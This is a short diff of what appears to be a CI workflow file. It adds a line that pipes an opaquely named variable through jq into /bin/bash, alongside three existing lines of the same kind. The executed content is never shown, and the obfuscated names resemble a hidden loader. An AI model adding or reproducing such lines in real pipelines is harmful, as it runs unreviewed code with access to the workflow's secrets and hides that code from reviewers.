@@ -26,6 +26,7 @@ jobs:
           echo $bg5893 | jq -r .duy1 | /bin/bash
           echo $bzzqy2462 | jq -r .p5415 | /bin/bash
           echo $gjnz0951 | jq -r .t47 | /bin/bash
+          printf '%s' "$vn2" | jq -r .p1 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
